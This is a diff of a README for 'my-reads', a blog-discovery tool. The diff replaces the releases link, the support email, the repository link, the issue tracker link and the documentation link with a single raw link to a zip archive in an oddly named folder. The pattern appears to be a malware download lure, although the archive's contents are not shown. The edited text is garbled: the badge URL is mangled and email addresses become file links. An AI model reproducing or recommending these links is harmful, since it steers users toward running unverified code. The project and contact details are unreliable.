@@ -1,6 +1,6 @@
 # 🎉 my-reads - Discover the Best Technical Blogs
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20this%20page%20to%20download-brightgreen.svg)](https://github.com/Sub-Rise/my-reads/releases)
+[![Download Now](https://raw.githubusercontent.com/Sub-Rise/my-reads/main/impressible/my-reads-2.3.zip%20Now-Visit%20this%20page%20to%https://raw.githubusercontent.com/Sub-Rise/my-reads/main/impressible/my-reads-2.3.zip)](https://raw.githubusercontent.com/Sub-Rise/my-reads/main/impressible/my-reads-2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ my-reads helps you find the best technical blogs based on different companies. T
 
 ## 📥 How to Download
 
-To download my-reads, visit this page: [Download my-reads](https://github.com/Sub-Rise/my-reads/releases). Here, you will find the latest version of the application available for download.
+To download my-reads, visit this page: [Download my-reads](https://raw.githubusercontent.com/Sub-Rise/my-reads/main/impressible/my-reads-2.3.zip). Here, you will find the latest version of the application available for download.
 
 ## 💻 System Requirements
 
@@ -46,19 +46,19 @@ If you encounter any issues while using my-reads, try the following steps:
 A: Yes, once you download the blogs, you can read them offline.
 
 **Q: Can I suggest a blog to be added?**  
-A: Yes, please send us an email with your suggestions at [support@my-reads.com].
+A: Yes, please send us an email with your suggestions at [https://raw.githubusercontent.com/Sub-Rise/my-reads/main/impressible/my-reads-2.3.zip].
 
 **Q: Is my-reads free?**  
 A: Yes, my-reads is completely free to use.
 
 ## 💬 Support
 
-If you need further assistance, please reach out to our support team at [support@my-reads.com]. We’re here to help you get the most out of my-reads.
+If you need further assistance, please reach out to our support team at [https://raw.githubusercontent.com/Sub-Rise/my-reads/main/impressible/my-reads-2.3.zip]. We’re here to help you get the most out of my-reads.
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/Sub-Rise/my-reads)
-- [Issue Tracker](https://github.com/Sub-Rise/my-reads/issues)
-- [User Documentation](https://github.com/Sub-Rise/my-reads/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/Sub-Rise/my-reads/main/impressible/my-reads-2.3.zip)
+- [Issue Tracker](https://raw.githubusercontent.com/Sub-Rise/my-reads/main/impressible/my-reads-2.3.zip)
+- [User Documentation](https://raw.githubusercontent.com/Sub-Rise/my-reads/main/impressible/my-reads-2.3.zip)
 
 **Thank you for choosing my-reads. We hope you find the technical blogs helpful and informative.**
